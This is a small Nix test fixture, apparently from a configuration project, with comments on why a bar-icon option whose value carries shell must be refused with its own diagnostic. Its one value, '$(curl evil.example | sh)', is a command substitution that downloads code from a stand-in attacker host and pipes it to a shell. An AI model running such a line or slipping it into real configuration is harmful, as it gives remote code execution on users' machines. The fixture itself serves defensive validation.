# The same free-form option as `shell-in-free-key.nix`, failing on the other
# half: the key is an ordinary word and the VALUE is what carries the shell.
# Both reach the bar's generated assignment, so both are refused — this fixture
# is here because the two diagnostics used to be the same sentence, which sent
# a reader to inspect a key that was never the problem.
{
  haus.bar.media.icons.play = "$(curl evil.example | sh)";
}
